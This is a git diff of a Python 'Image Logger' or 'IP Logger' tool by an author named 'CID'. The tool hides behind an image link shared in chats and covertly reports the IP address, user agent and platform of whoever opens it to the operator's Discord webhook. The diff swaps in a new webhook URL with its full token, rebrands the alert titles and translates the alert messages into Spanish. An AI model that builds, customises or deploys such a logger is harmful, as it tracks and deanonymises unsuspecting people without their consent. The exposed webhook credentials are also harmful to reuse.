@@ -11,13 +11,13 @@ __author__ = "CID"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1340910948231151666/-FEC8VLZ8WwDF7V3wwhS19uqtEiXo4YK_UnFrVzpFLCi6vJmnaFPXrt693tAB-S8MuYD",
+    "webhook": "https://discord.com/api/webhooks/1334994830517993552/MpqAcsKa13aPyH74rT6Ttfpj4TBFAeKoC0NVWI4AF24TmPOmZK-A6HTaJTbb8JwA-vqm",
     "image": "https://i.ibb.co/1fnqnqzz/Roblox-2025-01-08-02-08-57.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "IP INFO 🥵", # Set this to the name you want the webhook to have
+    "username": "IP INFO 🥵 \n BY CID 🥰", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -79,9 +79,9 @@ def reportError(error):
     "content": "@everyone",
     "embeds": [
         {
-            "title": "Image Logger - Error",
+            "title": "IP Logger - Error",
             "color": config["color"],
-            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
+            "description": f"Se produjo un error al intentar registrar una IP!\n\n**Error:**\n```\n{error}\n```",
         }
     ],
 })
@@ -98,9 +98,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": "Image Logger - Link Sent",
+            "title": "IP Logger - Text Sent",
             "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+            "description": f"An **Text Logging** UN MENSAJE FUE ENVIADO EN CHAT!\nEs posible que recibas una IP pronto.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
@@ -143,9 +143,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - IP Logged",
+            "title": "IP Logger 🥰 - IP Logged",
             "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+            "description": f"""**UN USUARIO VIO EM MENSAJE!**
 
 **Endpoint:** `{endpoint}`
             
